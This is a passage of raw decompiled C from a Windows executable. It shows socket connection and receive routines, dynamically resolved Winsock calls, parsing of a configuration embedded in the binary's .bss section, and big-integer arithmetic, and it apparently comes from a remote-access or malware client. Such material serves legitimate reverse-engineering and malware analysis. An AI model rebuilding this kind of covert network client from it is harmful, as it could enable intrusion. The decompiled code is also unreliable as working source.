            *(int32_t *)(v13 - 20) = v15;
            v5 = NULL;
            *(int32_t *)(v13 - 24) = v9;
            function_403fc7((int32_t)v5, 0);
            *(int32_t *)(v13 - 28) = v10;
            v22 = v13 - 32;
            *(int32_t *)v22 = v10;
            *(int32_t *)(v13 - 36) = v10;
            function_404094((int32_t)&g322);
            *(int32_t *)(v13 - 40) = v22;
            *(int32_t *)(v13 - 44) = v22;
            *(int32_t *)(v13 - 48) = v12;
            function_404094((int32_t)&g322);
            function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
            v23 = *(int32_t *)(v8 + 4);
            v24 = v23 + 12;
            v19 = v22;
            v16 = v15;
            v20 = v22;
            v17 = v15;
            if (v23 != 0) {
                *(int32_t *)(v19 - 4) = 0;
                *(int32_t *)(v19 - 8) = v24 - v16;
                *(int32_t *)(v19 - 12) = v16 + v9;
                v25 = v19 - 16;
                *(int32_t *)v25 = *v2;
                v26 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
                if (v26 == -1) {
                    // 0x40684e
                    function_404081();
                    if (v5 == NULL) {
                        return function_404081();
                    } else {
                        // 0x40685d
                        function_406f66();
                        return function_404081();
                    }
                }
                // 0x4067a4
                v27 = v26 + v16;
                v19 = v25;
                v16 = v27;
                v20 = v25;
                v17 = v27;
                while (v24 != v27) {
                    // 0x406782
                    *(int32_t *)(v19 - 4) = 0;
                    *(int32_t *)(v19 - 8) = v24 - v16;
                    *(int32_t *)(v19 - 12) = v16 + v9;
                    v25 = v19 - 16;
                    *(int32_t *)v25 = *v2;
                    v26 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
                    if (v26 == -1) {
                        // 0x40684e
                        function_404081();
                        if (v5 == NULL) {
                            return function_404081();
                        } else {
                            // 0x40685d
                            function_406f66();
                            return function_404081();
                        }
                    }
                    // 0x4067a4
                    v27 = v26 + v16;
                    v19 = v25;
                    v16 = v27;
                    v20 = v25;
                    v17 = v27;
                }
            }
            // 0x4067aa
            function_404081();
            if (v5 != NULL) {
                // 0x4067b9
                function_406f66();
            }
            // 0x4067be
            v5 = NULL;
            v21 = v20;
            v18 = v17;
        }
        // 0x4067cd
        v28 = v18;
        *(int32_t *)(v21 - 4) = v28;
        *(int32_t *)(v21 - 8) = v9;
        function_403fc7((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v21 - 12) = v4;
        v29 = v21 - 16;
        *(int32_t *)v29 = v4;
        v30 = (int32_t *)(v21 - 20);
        *v30 = v4;
        function_404094((int32_t)&g322);
        v31 = (int32_t *)(v21 - 24);
        *v31 = v29;
        v32 = v21 - 28;
        v33 = (int32_t *)v32;
        *v33 = v29;
        *(int32_t *)(v21 - 32) = v12;
        function_404094((int32_t)&g322);
        function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        function_403ffa();
        *v30 = v28;
        *v31 = sock;
        function_403fc7((int32_t)&g322, (int32_t)&g322);
        if (v3 != 0) {
            // 0x40681d
            function_406f66();
        }
        // 0x406822
        v3 = 0;
        function_403ffa();
        *v33 = a1;
        function_405f6c((int32_t)&g322);
        function_404081();
    }
  lab_0x406862:
    // 0x40686a
    return function_404081();
}

// Address range: 0x406871 - 0x40696e
int32_t function_406871(int32_t a1, int32_t host_short) {
    // 0x406871
    int128_t v1; // 0x406871
    int128_t v2 = v1;
    int32_t v3 = a1;
    function_40415d((int32_t)&v3);
    int32_t v4; // 0x406871
    *(int32_t *)(v4 + 4) = host_short;
    function_414047();
    int128_t v5 = __asm_xorps(v2, v2); // 0x4068ae
    int64_t v6; // 0x406871
    __asm_movlpd(v6, v5);
    __asm_movlpd(v6, v5);
    int32_t v7 = getaddrinfo((char *)1, (char *)&g322, (struct addrinfo *)&g322, (struct addrinfo **)&g322); // 0x4068c6
    if (v7 != 0) {
        // 0x40694c
        function_406f1d();
        return 0;
    }
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x4068dd
    int32_t * v8 = (int32_t *)(v4 + 12); // 0x4068e3
    *v8 = sock_fd;
    if (sock_fd == -1) {
        // 0x40694c
        function_406f1d();
        return 0;
    }
    int32_t v9 = v4 + 456; // 0x4068ee
    *(int32_t *)(v4 + 460) = *(int32_t *)(*(int32_t *)24 + 4);
    *(int16_t *)v9 = 2;
    *(int16_t *)(v4 + 458) = htons((int16_t)host_short);
    freeaddrinfo(NULL);
    GetProcAddress(LoadLibraryA("Ws2_32.dll"), "connect");
    int32_t v10 = WSAConnect(*v8, (struct sockaddr *)v9, 16, NULL, NULL, NULL, NULL); // 0x40693c
    int32_t result; // 0x406871
    if (v10 != -1) {
        // 0x40695d
        *(int32_t *)(v4 + 8) = 1;
        ReleaseMutex((int32_t *)*(int32_t *)(v4 + 472));
        result = 1;
    } else {
        // 0x406947
        *v8 = *v8 | v10;
        result = 0;
    }
    // 0x40694c
    function_406f1d();
    return result;
}

// Address range: 0x40696e - 0x4069a9
int32_t function_40696e(void) {
    // 0x40696e
    int32_t result; // 0x40696e
    *(int32_t *)result = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)(result + 20) = 0;
    *(int32_t *)(result + 48) = 0;
    *(int32_t *)(result + 52) = 0;
    function_414070(result);
    WSAStartup(2, (struct WSAData *)(result + 56));
    *(int32_t *)(result + 12) = -1;
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 36) = 0;
    return result;
}

// Address range: 0x4069a9 - 0x4069f6
int32_t function_4069a9(int32_t * a1) {
    // 0x4069a9
    int32_t v1; // 0x4069a9
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x4069b2
    int32_t v3; // bp-20, 0x4069a9
    int32_t * v4 = &v3; // 0x4069b9
    if (*v2 == 0) {
        // 0x4069bb
        int32_t v5; // bp-12, 0x4069a9
        int32_t v6 = function_403e83(&v5, 4, *(int32_t *)*(int32_t *)(v1 + 80)); // 0x4069c8
        int32_t v7 = v6; // bp-36, 0x4069cd
        function_403eca(v6);
        function_404081();
        *v2 = 1;
        v4 = &v7;
    }
    // 0x4069e4
    *(int32_t *)((int32_t)v4 - 4) = v1 + 8;
    function_404094((int32_t)&g322);
    return (int32_t)a1;
}

// Address range: 0x4069f6 - 0x406a4e
int32_t function_4069f6(int32_t * a1) {
    // 0x4069f6
    int32_t v1; // 0x4069f6
    int32_t v2 = v1 + 80; // 0x4069ff
    int32_t v3 = *(int32_t *)*(int32_t *)v2; // 0x406a04
    int32_t v4; // bp-16, 0x4069f6
    function_403e83(&v4, v3 + 4, -4 - v3 + *(int32_t *)(v1 + 84));
    int32_t v5 = v2; // bp-44, 0x406a1d
    function_404094((int32_t)&v4);
    int32_t v6 = &v5; // bp-56, 0x406a2a
    function_4069a9(&v6);
    function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    function_404081();
    return (int32_t)a1;
}

// Address range: 0x406a4e - 0x406a52
int32_t function_406a4e(void) {
    // 0x406a4e
    int32_t v1; // 0x406a4e
    return *(int32_t *)(v1 + 72);
}

// Address range: 0x406a52 - 0x406a56
int32_t function_406a52(void) {
    // 0x406a52
    int32_t v1; // 0x406a52
    return *(int32_t *)(v1 + 68);
}

// Address range: 0x406a56 - 0x406a5a
int32_t function_406a56(void) {
    // 0x406a56
    int32_t v1; // 0x406a56
    return *(int32_t *)(v1 + 64);
}

// Address range: 0x406a5a - 0x406a70
int32_t function_406a5a(int32_t result) {
    // 0x406a5a
    int32_t v1; // 0x406a5a
    function_404656(v1 + 56);
    return result;
}

// Address range: 0x406a70 - 0x406a86
int32_t function_406a70(int32_t result) {
    // 0x406a70
    int32_t v1; // 0x406a70
    function_404656(v1 + 44);
    return result;
}

// Address range: 0x406a86 - 0x406a8a
int32_t function_406a86(void) {
    // 0x406a86
    int32_t v1; // 0x406a86
    return *(int32_t *)(v1 + 76);
}

// Address range: 0x406a8a - 0x406a8e
int32_t function_406a8a(void) {
    // 0x406a8a
    int32_t v1; // 0x406a8a
    return *(int32_t *)(v1 + 40);
}

// Address range: 0x406a8e - 0x406aa4
int32_t function_406a8e(int32_t result) {
    // 0x406a8e
    int32_t v1; // 0x406a8e
    function_404656(v1 + 36);
    return result;
}

// Address range: 0x406aa4 - 0x406aa8
int32_t function_406aa4(void) {
    // 0x406aa4
    int32_t v1; // 0x406aa4
    return *(int32_t *)(v1 + 32);
}

// Address range: 0x406aa8 - 0x406ca5
int32_t function_406aa8(void) {
    // 0x406aa8
    Sleep(500);
    function_414227();
    function_41411e(function_415c0e());
    int32_t v1 = function_40434f(".bss"); // 0x406ae8
    int32_t v2; // bp-72, 0x406aa8
    function_414091(&v2, v1);
    function_406f1d();
    int32_t v3; // bp-32, 0x406aa8
    function_404094((int32_t)&v3);
    int32_t v4; // bp-16, 0x406aa8
    function_403eca((int32_t)&v4);
    function_404081();
    int32_t v5; // bp-24, 0x406aa8
    function_4069f6(&v5);
    int32_t v6 = *(int32_t *)v5; // 0x406b36
    function_4043c7(function_415dc4(v6));
    function_406f1d();
    int32_t v7 = v6 + 4; // 0x406b56
    int32_t v8; // 0x406aa8
    *(int32_t *)(v8 + 20) = *(int32_t *)(v7 + v5);
    int32_t v9 = v5 + 4; // 0x406b62
    int32_t v10 = *(int32_t *)(v7 + v9); // 0x406b62
    function_4043c7(function_415dc4(v10));
    function_406f1d();
    int32_t v11 = v6 + 12 + v10; // 0x406b8a
    int32_t v12; // bp-8, 0x406aa8
    *(int32_t *)(v12 + 28) = *(int32_t *)(v11 + v5);
    int32_t v13 = *(int32_t *)(v11 + v9); // 0x406b95
    function_4043c7(function_415dc4(v13));
    function_406f1d();
    int32_t v14 = v11 + 8 + v13; // 0x406bbd
    *(int32_t *)(v12 + 32) = (int32_t)*(char *)(v14 + v5);
    int32_t v15 = v5 + 1; // 0x406bc9
    int32_t v16 = *(int32_t *)(v14 + v15); // 0x406bc9
    function_4043c7(function_415dc4(v16));
    function_406f1d();
    int32_t v17 = v14 + 5 + v16; // 0x406bf1
    *(int32_t *)(v12 + 40) = (int32_t)*(char *)(v17 + v5);
    int32_t v18 = *(int32_t *)(v17 + v15); // 0x406bfd
    function_4043c7(function_415dc4(v18));
    function_406f1d();
    int32_t v19 = v17 + 5 + v18; // 0x406c22
    int32_t v20 = v19 + v5;
    *(int32_t *)(v12 + 52) = *(int32_t *)v20;
    *(int32_t *)(v12 + 60) = (int32_t)*(char *)(v19 + v9);
    *(int32_t *)(v12 + 64) = (int32_t)*(char *)(v20 + 5);
    *(int32_t *)(v12 + 68) = (int32_t)*(char *)(v20 + 6);
    int32_t v21 = v19 + 8; // 0x406c50
    *(int32_t *)(v12 + 72) = (int32_t)*(char *)(v20 + 7);
    *(int32_t *)(v12 + 76) = (int32_t)*(char *)(v21 + v5);
    function_415dc4(*(int32_t *)(v21 + v15));
    function_4043c7((int32_t)&v12);
    *(int32_t *)v12 = 1;
    *(int32_t *)(v12 + 4) = 1;
    function_406f1d();
    function_404081();
    function_404081();
    return function_402453();
}

// Address range: 0x406ca5 - 0x406ccd
int32_t function_406ca5(void) {
    // 0x406ca5
    int32_t result; // 0x406ca5
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 36) = 0;
    *(int32_t *)(result + 44) = 0;
    *(int32_t *)(result + 48) = 0;
    *(int32_t *)(result + 56) = 0;
    *(int32_t *)(result + 80) = 0;
    *(int32_t *)(result + 84) = 0;
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    return result;
}

// Address range: 0x406ccd - 0x406d27
int32_t function_406ccd(void) {
    // 0x406ccd
    function_404081();
    function_406f1d();
    int32_t v1; // 0x406ccd
    *(int32_t *)(v1 + 56) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 48) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 44) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 36) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 24) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 16) = 0;
    return function_404081();
}

// Address range: 0x406d27 - 0x406d2b
int32_t function_406d27(void) {
    // 0x406d27
    int32_t v1; // 0x406d27
    return *(int32_t *)(v1 + 52);
}

// Address range: 0x406d2b - 0x406d2f
int32_t function_406d2b(void) {
    // 0x406d2b
    int32_t v1; // 0x406d2b
    return *(int32_t *)(v1 + 60);
}

// Address range: 0x406d2f - 0x406d50
int32_t function_406d2f(int32_t * a1) {
    int32_t result = (int32_t)a1;
    int32_t v1; // 0x406d2f
    function_404656(v1 + 16);
    *(int32_t *)(result + 4) = *(int32_t *)(v1 + 20);
    return result;
}

// Address range: 0x406d50 - 0x406d65
int32_t function_406d50(void) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g322, (int32_t)&g322); // 0x406d5e
    return (int32_t)v1;
}

// Address range: 0x406d65 - 0x406da4
int32_t function_406d65(void) {
    char * v1 = "MessageBoxA"; // bp-12, 0x406d73
    int32_t (*func)() = GetProcAddress(LoadLibraryA("USER32.DLL"), "MessageBoxA"); // 0x406d79
    int32_t v2; // 0x406d65
    if ((char)v2 != 0) {
        // 0x406da3
        return (int32_t)func;
    }
    int32_t v3 = (int32_t)&v1; // 0x406d86
    if (func != NULL) {
        int32_t v4 = 0; // bp-28, 0x406d97
        v3 = &v4;
    }
    // 0x406d9b
    *(int32_t *)(v3 - 4) = 1;
    ExitProcess((int32_t)&g322);
    // UNREACHABLE
}

// Address range: 0x406da4 - 0x406df0
int32_t entry_point(void) {
    // 0x406da4
    GetCommandLineA();
    int32_t lpStartupInfo; // bp-76, 0x406da4
    GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
    function_406df1();
    function_406e1e();
    GetModuleHandleA(NULL);
    int32_t uExitCode = function_4174cd((int32_t)&g146, (int32_t)&g146); // 0x406ddd
    function_406e06();
    ExitProcess(uExitCode);
    // UNREACHABLE
}

// Address range: 0x406df1 - 0x406e06
int32_t function_406df1(void) {
    // 0x406df1
    g305 = 32;
    int32_t result = function_406d50(); // 0x406dfb
    g260 = result;
    return result;
}

// Address range: 0x406e06 - 0x406e1e
int32_t function_406e06(void) {
    // 0x406e06
    if (g306 == 0) {
        // 0x406e1d
        return 0;
    }
    // 0x406e0f
    return function_406e1e();
}

// Address range: 0x406e1e - 0x406e38
int32_t function_406e1e(void) {
    // 0x406e1e
    int32_t v1; // 0x406e1e
    if (v1 >= (uint32_t)v1) {
        // 0x406e35
        int32_t result; // 0x406e1e
        return result;
    }
    // 0x406e1e
    int32_t v2; // 0x406e1e
    int32_t v3 = v2;
    int32_t v4 = v3 + 4; // 0x406e2e
    while (v4 < (uint32_t)v1) {
        // 0x406e26
        v3 = v4;
        v4 = v3 + 4;
    }
    // 0x406e35
    return *(int32_t *)v3;
}

// Address range: 0x406e38 - 0x406e5c
int32_t function_406e38(void) {
    uint32_t v1 = g306; // 0x406e38
    if (v1 >= g305) {
        // 0x406e58
        return -1;
    }
    // 0x406e46
    g306 = v1 + 1;
    return 0;
}

// Address range: 0x406e5c - 0x406e6d
int32_t function_406e5c(void) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g322, (int32_t)&g322); // 0x406e66
    return (int32_t)v1;
}

// Address range: 0x406e6d - 0x406e8d
int32_t function_406e6d(void) {
    // 0x406e6d
    int32_t lpAddress; // 0x406e6d
    if (lpAddress == 0) {
        // 0x406e77
        return 0;
    }
    // 0x406e7b
    int32_t lpBuffer; // bp-32, 0x406e6d
    VirtualQuery((int32_t *)lpAddress, (struct _MEMORY_BASIC_INFORMATION *)&lpBuffer, 28);
    return lpAddress;
}

// Address range: 0x406e8d - 0x406ebe
int32_t function_406e8d(void) {
    // 0x406e8d
    int32_t dwSize; // 0x406e8d
    int32_t * memory = VirtualAlloc(NULL, dwSize, 0x3000, 4); // 0x406e9b
    if (memory == NULL) {
        // 0x406ea7
        GetLastError();
    }
    // 0x406ead
    function_401293(memory, 0, dwSize);
    return (int32_t)memory;
}

// Address range: 0x406ebe - 0x406f1d
int32_t function_406ebe(void) {
    // 0x406ebe
    int32_t v1; // 0x406ebe
    uint32_t v2 = v1;
    int32_t v3 = 0; // 0x406ed2
    if (v1 != 0) {
        // 0x406ed4
        v3 = function_406e6d();
    }
    if (v2 == 0) {
        // 0x406f0b
        if (v1 == 0) {
            // 0x406f16
            return 0;
        }
        // 0x406f0f
        function_406f1d();
        // 0x406f16
        return 0;
    }
    int32_t result = function_406f2c(); // 0x406ee4
    if (v1 == 0) {
        // 0x406f16
        return result;
    }
    uint32_t v4 = v3;
    if (v4 != 0 && result != 0) {
        int32_t v5 = v2 < v4 ? v2 : v4; // 0x406efa
        function_40126d((int32_t *)result, (int32_t *)v1, v5);
    }
    // 0x406f0f
    function_406f1d();
    // 0x406f16
    return result;
}

// Address range: 0x406f1d - 0x406f2c
int32_t function_406f1d(void) {
    // 0x406f1d
    int32_t lpAddress; // 0x406f1d
    return VirtualFree((int32_t *)lpAddress, 0, 0x8000);
}

// Address range: 0x406f2c - 0x406f3d
int32_t function_406f2c(void) {
    // 0x406f2c
    int32_t dwSize; // 0x406f2c
    return (int32_t)VirtualAlloc(NULL, dwSize, 0x3000, 4);
}

// Address range: 0x406f3d - 0x406f66
int32_t function_406f3d(void) {
    // 0x406f3d
    int32_t v1; // 0x406f3d
    if (v1 == 0) {
        // 0x406f41
        return function_406f77();
    }
    if (v1 != 0) {
        int32_t * v2 = HeapReAlloc(GetProcessHeap(), (int32_t)&g322, &g322, (int32_t)&g322); // 0x406f5f
        return (int32_t)v2;
    }
    // 0x406f4c
    function_406f66();
    return 0;
}

// Address range: 0x406f66 - 0x406f77
int32_t function_406f66(void) {
    // 0x406f66
    return HeapFree(GetProcessHeap(), (int32_t)&g322, &g322);
}

// Address range: 0x406f77 - 0x406f88
int32_t function_406f77(void) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g322, (int32_t)&g322); // 0x406f81
    return (int32_t)v1;
}

// Address range: 0x406f88 - 0x406f8d
int32_t function_406f88(void) {
    // 0x406f88
    return function_406f8d();
}

// Address range: 0x406f8d - 0x406fa2
int32_t function_406f8d(void) {
    // 0x406f8d
    int32_t result; // 0x406f8d
    int32_t v1; // 0x406f8d
    if (v1 != 0) {
        // 0x406f91
        result = HeapFree(GetProcessHeap(), (int32_t)&g322, &g322);
    }
    // 0x406fa1
    return result;
}

// Address range: 0x406fa2 - 0x406fa7
int32_t function_406fa2(void) {
    // 0x406fa2
    return function_406f8d();
}

// Address range: 0x406fa7 - 0x406fb8
int32_t function_406fa7(void) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g322, (int32_t)&g322); // 0x406fb1
    return (int32_t)v1;
}

// Address range: 0x406fb8 - 0x406fbd
int32_t function_406fb8(void) {
    // 0x406fb8
    return function_406fa7();
}

// Address range: 0x406fbd - 0x406fc2
int32_t function_406fbd(void) {
    // 0x406fbd
    return function_406f8d();
}

// Address range: 0x406fc2 - 0x406ff8
int32_t function_406fc2(void) {
    int32_t * moduleHandle = LoadLibraryA("USER32.DLL"); // 0x406fc7
    int32_t v1 = (int32_t)moduleHandle; // bp-12, 0x406fd2
    int32_t (*func)() = GetProcAddress(moduleHandle, "MessageBoxA"); // 0x406fd3
    int32_t * v2 = &v1; // 0x406fdb
    if (func != NULL) {
        int32_t v3 = 0; // bp-28, 0x406fec
        v2 = &v3;
    }
    // 0x406ff0
    *(int32_t *)((int32_t)v2 - 4) = 1;
    ExitProcess((int32_t)&g322);
    // UNREACHABLE
}

// Address range: 0x406ff9 - 0x406ffc
int32_t function_406ff9(void) {
    // 0x406ff9
    int32_t result; // 0x406ff9
    return result;
}

// Address range: 0x406ffc - 0x40702c
int32_t function_406ffc(void) {
    // 0x406ffc
    int32_t result; // 0x406ffc
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    function_409554(*(int32_t *)(result + 4));
    int32_t v1; // bp-28, 0x406ffc
    function_403fc7((int32_t)&v1, 20);
    return result;
}

// Address range: 0x40702c - 0x40709b
int32_t function_40702c(int32_t result, int32_t a2) {
    int32_t * memoryHandle = LocalAlloc(64, 256); // 0x407043
    int32_t v1; // bp-276, 0x40702c
    function_401293(&v1, 0, 250);
    int32_t v2; // 0x40702c
    function_40126d(&v1, (int32_t *)v2, v2);
    function_4024bb(result);
    LocalFree(memoryHandle);
    return result;
}

// Address range: 0x40709b - 0x4070ea
int32_t function_40709b(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a3;
    int32_t v2 = &v1; // 0x4070a6
    function_404094(v2);
    function_40702c(v1, a4);
    function_404094(v2);
    function_404081();
    function_404081();
    function_404081();
    int32_t result; // 0x40709b
    return result;
}

// Address range: 0x4070ea - 0x40726f
int32_t function_4070ea(int32_t a1) {
    int32_t v1 = function_4073bd(); // 0x407100
    int32_t v2 = function_407d57(); // 0x407109
    int32_t v3 = function_401000(4); // 0x407113
    int32_t v4; // bp-40, 0x4070ea
    int32_t v5 = &v4; // 0x407118
    int32_t v6; // 0x4070ea
    int32_t * v7 = (int32_t *)(v6 + 48); // 0x40711b
    *v7 = v3;
    *(int32_t *)*v7 = function_407d2d();
    int32_t * v8 = (int32_t *)(v6 + 52); // 0x40712d
    *v8 = 1;
    function_407dae();
    int32_t * v9 = (int32_t *)(v5 - 4);
    int32_t * v10 = (int32_t *)(v5 - 8);
    int32_t * v11 = (int32_t *)(v5 - 12);
    int32_t v12; // 0x4070ea
    int32_t v13; // 0x4070ea
    int32_t v14; // 0x4070ea
    int32_t v15; // 0x4070ea
    int32_t v16; // 0x4070ea
    int32_t v17; // 0x4070ea
    int32_t v18; // 0x4070ea
    int32_t v19; // 0x4070ea
    int32_t v20; // 0x4070ea
    int32_t v21; // 0x4070ea
    int32_t v22; // 0x4071db
    int32_t v23; // 0x4071ea
    int32_t v24; // 0x407173
    int32_t v25; // 0x4071a7
    int32_t v26; // 0x4071cc
    int32_t v27; // 0x4071cf
    if (function_407384() == 0) {
        // 0x4071f5
        function_407dc4();
        v20 = v2;
        v15 = v1;
    } else {
        // 0x40714f
        v12 = 0;
        v14 = 0;
        if (v1 >= 0) {
            // 0x40715f
            v17 = v1;
            if (function_407384() == 0) {
                v24 = v1 + 1;
                v16 = v24;
                v17 = v24;
                while (function_407384() == 0) {
                    // 0x407170
                    v24 = v16 + 1;
                    v16 = v24;
                    v17 = v24;
                }
            }
            // 0x407185
            v18 = v17;
            v12 = 0;
            v14 = v18;
            if (v1 >= v18) {
                function_407dc4();
                *v9 = 0;
                *v10 = 0;
                *v11 = v2;
                function_407512((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
                v25 = function_40726f();
                v26 = (int32_t)(function_407384() != 0) << (int32_t)(v1 != v18);
                v27 = v1 - 1;
                v21 = v25;
                v19 = v26;
                v13 = v27;
                v12 = v26;
                v14 = v18;
                while (v27 >= v18) {
                    // 0x40718c
                    function_407dc4();
                    *v9 = 0;
                    *v10 = 0;
                    *v11 = v21;
                    function_407512((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
                    v25 = function_40726f();
                    v26 = v19 + (int32_t)(function_407384() != 0) << (int32_t)(v13 != v18);
                    v27 = v13 - 1;
                    v21 = v25;
                    v19 = v26;
                    v13 = v27;
                    v12 = v26;
                    v14 = v18;
                }
            }
        }
        // 0x4071db
        v22 = v12 - 1;
        v23 = *(int32_t *)(4 * (v22 >= 0 ? v22 : v12) / 2 + *v7);
        v20 = v23;
        v15 = v14;
    }
    int32_t v28 = v15 - 1; // 0x407209
    *v9 = 0;
    *v10 = 0;
    *v11 = v20;
    function_407512(v20, (int32_t)&g322, (int32_t)&g322);
    int32_t result = function_40726f(); // 0x407221
    while (v28 >= 0) {
        int32_t v29 = v28;
        int32_t v30 = result;
        if (function_407384() == 0) {
            // 0x4071f5
            function_407dc4();
            v20 = v30;
            v15 = v29;
        } else {
            // 0x40714f
            v12 = 0;
            v14 = 0;
            if (v29 >= 0) {
                // 0x40715f
                v16 = v29;
                v17 = v29;
                if (function_407384() == 0) {
                    v24 = v16 + 1;
                    v16 = v24;
                    v17 = v24;
                    while (function_407384() == 0) {
                        // 0x407170
                        v24 = v16 + 1;
                        v16 = v24;
                        v17 = v24;
                    }
                }
                // 0x407185
                v18 = v17;
                v21 = v30;
                v13 = v29;
                v12 = 0;
                v14 = v18;
                if (v29 >= v18) {
                    function_407dc4();
                    *v9 = 0;
                    *v10 = 0;
                    *v11 = v21;
                    function_407512((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
                    v25 = function_40726f();
                    v26 = (int32_t)(function_407384() != 0) << (int32_t)(v13 != v18);
                    v27 = v13 - 1;
                    v21 = v25;
                    v19 = v26;
                    v13 = v27;
                    v12 = v26;
                    v14 = v18;
                    while (v27 >= v18) {
                        // 0x40718c
                        function_407dc4();
                        *v9 = 0;
                        *v10 = 0;
                        *v11 = v21;
                        function_407512((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
                        v25 = function_40726f();
                        v26 = v19 + (int32_t)(function_407384() != 0) << (int32_t)(v13 != v18);
                        v27 = v13 - 1;
                        v21 = v25;
                        v19 = v26;
                        v13 = v27;
                        v12 = v26;
                        v14 = v18;
                    }
                }
            }
            // 0x4071db
            v22 = v12 - 1;
            v23 = *(int32_t *)(4 * (v22 >= 0 ? v22 : v12) / 2 + *v7);
            v20 = v23;
            v15 = v14;
        }
        // 0x407207
        v28 = v15 - 1;
        *v9 = 0;
        *v10 = 0;
        *v11 = v20;
        function_407512(v20, (int32_t)&g322, (int32_t)&g322);
        result = function_40726f();
    }
    int32_t v31 = 0; // 0x407234
    if (*v8 <= 0) {
        // 0x407254
        *v9 = *v7;
        function_401014((int32_t)&g322);
        function_407d69();
        return result;
    }
    function_407d95();
    function_407d69();
    v31++;
    while (v31 < *v8) {
        // 0x407236
        function_407d95();
        function_407d69();
        v31++;
    }
    // 0x407254
    *v9 = *v7;
    function_401014((int32_t)&g322);
    function_407d69();
    return result;
}

// Address range: 0x40726f - 0x40734c
int32_t function_40726f(void) {
    // 0x40726f
    int32_t v1; // 0x40726f
    int32_t v2 = v1;
    int32_t v3 = 4 * (int32_t)*(char *)(v2 + 64) + v2;
    int32_t v4 = *(int32_t *)(v3 + 12); // 0x40728a
    int32_t v5 = (int32_t)*(int16_t *)(v4 + 4); // 0x407291
    if (2 * v5 < (int32_t)*(int16_t *)(v1 + 4)) {
        // 0x407347
        return function_4078a0(v4, 1);
    }
    // 0x4072b2
    function_407d2d();
    function_407804();
    function_407512(*(int32_t *)(v3 + 24), 0, v5 - 1);
    function_407804();
    function_40734c();
    function_407512(v4, v5 + 1, 0);
    int32_t result = function_407c27(function_40734c(), 0); // 0x407333
    if (function_4074b0() >= 0) {
        // 0x407335
        result = function_407c27(v4, 0);
    }
    // 0x407347
    return result;
}

// Address range: 0x40734c - 0x40735b
int32_t function_40734c(void) {
    // 0x40734c
    int32_t result; // 0x40734c
    int16_t * v1 = (int16_t *)(result + 4); // 0x40734c
    if (result < (int32_t)*v1) {
        // 0x407354
        *v1 = (int16_t)result;
    }
    // 0x407358
    return result;
}

// Address range: 0x40735b - 0x407384
int32_t function_40735b(void) {
    // 0x40735b
    int32_t result; // 0x40735b
    int16_t * v1 = (int16_t *)(result + 4); // 0x40735b
    int16_t v2 = *v1; // 0x40735b
    int32_t v3 = *(int32_t *)(result + 12) - 4; // 0x407379
    if (v2 < 2 | *(int32_t *)(v3 + 4 * (int32_t)v2) != 0) {
        // 0x407380
        return result;
    }
    uint32_t v4 = (int32_t)v2; // 0x40736e
    int16_t v5 = v4;
    *v1 = v5;
    while (!((v5 < 2 | *(int32_t *)(0x10000 * v4 / 0x4000 + v3) != 0))) {
        // 0x40736e
        v4 %= 0x10000;
        v5 = v4;
        *v1 = v5;
    }
    // 0x407380
    return result;
}

// Address range: 0x407384 - 0x4073bd
int32_t function_407384(void) {
    // 0x407384
    int32_t v1; // 0x407384
    int32_t v2 = v1;
    int32_t v3 = *(int32_t *)(4 * ((v2 >> 31) % 32 + v2) / 32 + *(int32_t *)(v1 + 12)); // 0x407395
    int32_t v4 = v2 & -0x7fffffe1; // 0x407398
    int32_t v5 = 1; // 0x40739e
    if (v4 < 1) {
        // 0x4073b3
        return (1 & v3) != 0;
    }
    int32_t v6 = v4; // 0x40739e
    v5 *= 2;
    v6--;
    while (v6 != 0) {
        // 0x4073ac
        v5 *= 2;
        v6--;
    }
    // 0x4073b3
    return (v5 & v3) != 0;
}

// Address range: 0x4073bd - 0x4073ef
int32_t function_4073bd(void) {
    // 0x4073bd
    int32_t v1; // 0x4073bd
    int32_t v2 = (int32_t)*(int16_t *)(v1 + 4); // 0x4073c1
    int32_t v3 = -0x80000000; // 0x4073cd
    int32_t v4 = 31;
    while ((v3 & *(int32_t *)(*(int32_t *)(v1 + 12) - 4 + 4 * v2)) == 0) {
        // 0x4073d6
        v3 /= 2;
        if (v4 == 0) {
            // 0x4073ec
            return -1;
        }
        v4--;
    }
    // 0x4073ec
    return 32 * v2 - 32 + v4;
}

// Address range: 0x4073ef - 0x407458
int32_t function_4073ef(void) {
    // 0x4073ef
    int32_t v1; // 0x4073ef
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x4073f6
    int32_t v3 = *v2; // 0x4073f6
    int16_t v4; // 0x4073ef
    int32_t * v5; // 0x4073ef
    int32_t * v6; // 0x4073ef
    int32_t result; // 0x4073ef
    if (v3 == 0) {
        int32_t v7 = function_401000(16); // 0x407421
        *(int32_t *)(v7 + 12) = function_401000(4 * v1);
        int16_t v8 = v1;
